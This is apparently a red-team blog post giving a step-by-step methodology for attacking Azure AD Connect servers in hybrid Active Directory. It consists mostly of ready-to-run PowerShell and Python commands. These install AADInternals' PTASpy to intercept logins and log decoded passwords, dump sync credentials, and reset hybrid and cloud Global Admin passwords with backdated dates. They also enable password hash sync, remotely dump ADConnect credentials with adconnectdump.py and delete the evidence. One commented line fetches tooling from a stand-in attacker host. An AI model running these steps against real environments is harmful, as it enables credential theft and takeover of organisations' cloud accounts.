---
layout: '../../layouts/Post.astro'
title: Hybrid AD - Attack Methodology
# image: https://expandingarctopus.s3.us-east-1.amazonaws.com/kerberos1
image: '/images/kerberos1'
publishedAt: 2023-10-1
category: 'Hybrid'
---

## Overview

Methodology for attacking AD Connect servers in Hybrid AD environments.

### Resources 

##### Escalate from Local Admin
https://aadinternals.com/post/on-prem_admin/

##### AADInternals Docs
https://aadinternals.com/aadinternals/

##### Dump ADConnect creds like secretsdump 
https://github.com/fox-it/adconnectdump

##### In-depth on what adconnectdump is doing behind the scenes
https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/

##### In-Depth - Azure AD Connect for Red Teamerr
https://blog.xpnsec.com/azuread-connect-for-redteam/

##### In-depth - HybridIdentity Administrator / Service account - Attack and Detection 
https://github.com/Cloud-Architekt/AzureAD-Attack-Defense/blob/main/AADCSyncServiceAccount.md#suspicious-activities-from-azure-ad-connector-account

##### Exploiting Azure AD PTA vulns
https://aadinternals.com/post/pta/

##### Azure Red Team lab 
https://improsec.com/tech-blog/read2own

##### PTA Dumping
https://imphash.medium.com/shooting-up-on-prem-to-cloud-detecting-aadconnect-creds-dump-422b21128729


Goal is to get local admin rights on the AD Connect server 

### Attacker - Get AADInternals 
```powershell
Install-Module AADInternals 
Import-Module AADInternals 
```

### Attacker - Get RSAT Tools
```powershell
Enable-WindowsOptionalFeature -Online -FeatureName RSAT-AD-PowerShell
```

### Attacker - Get ADConnectDump
```powershell
iwr https://github.com/fox-it/adconnectdump/archive/refs/heads/master.zip -o
adconnectdump.zip; Expand-Archive .\adconnectdump.zip
```

### Attacker - Finding ADConnect Account 
```powershell
Get-AADIntAccessTokenForAADIAMAPI -SaveToCache
Get-AADIntAADConnectStatus
```

### Attacker - Check Domain Properties of MSOL_* user and ADSync to find Server
```powershell
Get-AdUser -Filter * -Properties * | Where {$_.DisplayName -like 'MSOL*'} 
Get-AdUser -Filter * -Properties * | Where {$_.DisplayName -like 'ADSync*'} 
```


## Scenario 1 - PassThroughAuthentication - AD to AzAD Escalation

### Requirements:
Local Admin rights on the server running the ADConnect agent 
OR 
M365 Global Admin creds 

### AADInternals -  AADIntPTASpy - MITM the PtA traffic from the agent 
Summary: Every logon against AzAd on domain gets redirected to PTA agent on-prem. PTA checks with DC if password is valid for an account. If valid, Agent reaches out to AzureAD TO REQUEST ACCESS. 

### AADInternals - Bring over Tools
```powershell
$url = "https://github.com/Gerenios/AADInternals/archive/refs/heads/master.zip"
# $url = "https://attacker.legit.com:8000/AADInternals-master.zip"
```

### AADInternals - Install
```powershell
iwr $url -o aadint.zip; Expand-Archive .\aadint.zip
Import-Module .\AADInternals.psd1
```

### AADInternals - Start MITM of PTA 
```powershell
Install-AADIntPTASPY 
```

### AADInternals - Check decoded passwords left in C:\PTASpy\PTASpy.csv 
```powershell
Get-AADIntPTASpylog -DecodePasswords 
```

### AADInternals - Clean up CSV 
```powershell
Remove-Item -r -force C:\PTASpy
```

### AADInternals - Remove PTASpy
```powershell
Remove-AADIntPTASpy
```

## AADInternals - Log in as any user 
Every PTA attempt against Azure AD will be intercepted by the installed AADIntPTASpy module. The module will record the user’s password attempt and reply back to Azure AD on behalf of the PTA Agent. This reply advises Azure AD the password attempt was valid and grants the user access to the cloud, even if the password is incorrect. If an attacker has implanted AADIntPTASpy, they can log in as any user that attempts to authenticate using PTA—and will be granted access. 

## AADInternals - Perpetual Harvest as Glocal Cloud Admin 
If you have global admin, we can install the PTA agent on one of our own servers and register it as PTA Agent in the portal and continue recieve logins



## Scenario 2 - PasswordHashSync - AD to AzAd Escalation

### AADInternals - Decrypt DPAPI master keys and Sync Creds 
```powershell
Get-AADIntSyncCredentials 
```

### AADInternals - Modifying Users-  Save the displayed credentials to a variable
```powershell
$creds = Get-Credential 
```

### AADInternals - Get Tokena and Save to Cache
```powershell
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
```

### AADInternals - Get Users
```powershell
Get-AADIntUsers | Select UserPrincipalName,ImmutableId,ObjectId | Sort UserPrincipalName
```

### AADInternals - Users with immutable IDs are hybrid users and can be modified if we know their SourceAnchor
```powershell
Set-AADIntAzureADObject -SourceAnchor "UQ989+t6fEq9/0ogYtt1pA==" -displayName "I've been hacked!"
```

### AADInternals - Change a users password, change date to anything we want, no password policy enforced here
```powershell
Set-AADIntUserPassword -SourceAnchor "UQ989+t6fEq9/0ogYtt1pA==" -Password "NewPwd" -ChangeDate (Get-Date).AddYears(-1)
```

### AADInternals - If result 0, we're successful. Then list GAs
```powershell
Get-AADIntGlobalAdmins
```

### AADInternals - If Global Admin is a hybrid user with a SourceAnchor we can change the password the same way
### We can also change cloud admins by speciifying CloudAnchor
```powershell
Set-AADIntUserPassword -CloudAnchor "User_7b0ad665-a751-43d7-bb9a-7b8b1e6b1c59" -Password "NewPwd" -ChangeDate (Get-Date).AddYears(-1)
```

### Note - PHS
Password reset works only if the Password Hash Synchronisation (PHS) is enabled. Luckily, AAD Connect service account can turn it on. The following command just sets the PHS switch in Azure AD, it doesn’t start the actual PHS sync.

### Enable PHS
```powershell
Set-AADIntPasswordHashSyncEnabled -Enabled $true
```



## Scenario 3 - ADConnectDump.py - Remote Dump over Network

### Requirements: From Windows, Python2.7 Impacket, 
```powershell
adconnectdump.py, ADSyncQuery.exe
```

###  Python2 - Install Python2.7
```powershell
cinst -y python2
C:\Python27\python.exe -m pip install impacket pycryptodomex
```

### ADConnectDump - Download tool
```powershell
git clone https://github.com/fox-it/adconnectdump
cd adconnectdump
```

### ADConnectDump - Get MSSQL localDb for Dump
```powershell
Invoke-WebRequest -Uri https://go.microsoft.com/fwlink/?LinkID=866658 -OutFile SqlLocalDB.msi
Start-Process -FilePath msiexec.exe -ArgumentList '/i', 'SqlLocalDB.msi', '/qn' -Wait
Remove-Item -Path SqlLocalDB.msi
```

### ADConnectDump - Dump Creds with secretsdump style syntax
```powershell
$ServerName = "192.168.0.238" 
$password = "Password"
$username = "administrator"
$domain = "Shrine"
 C:\Python27\python.exe .\adconnectdump.py -dc-ip $ServerName -target-ip $ServerName Administrator@$ServerName
```

### Notes
You should call adconnectdump.py from Windows. It will dump the Azure AD connect credentials over the network similar to secretsdump.py (you also will need to have impacket and pycryptodomex installed to run this). ADSyncQuery.exe should be in the same directory as it will be used to parse the database that is downloaded (this requires MSSQL LocalDB installed on your host).

Alternatively you can run the tool on any OS, wait for it to download the DB and error out, then copy the mdf and ldf files to your Windows machine with MSSQL, run ADSyncQuery.exe c:\absolute\path\to\ADSync.mdf > out.txt and use this out.txt on your the system which can reach the Azure AD connect host with --existing-db and --from-file out.txt to do the rest.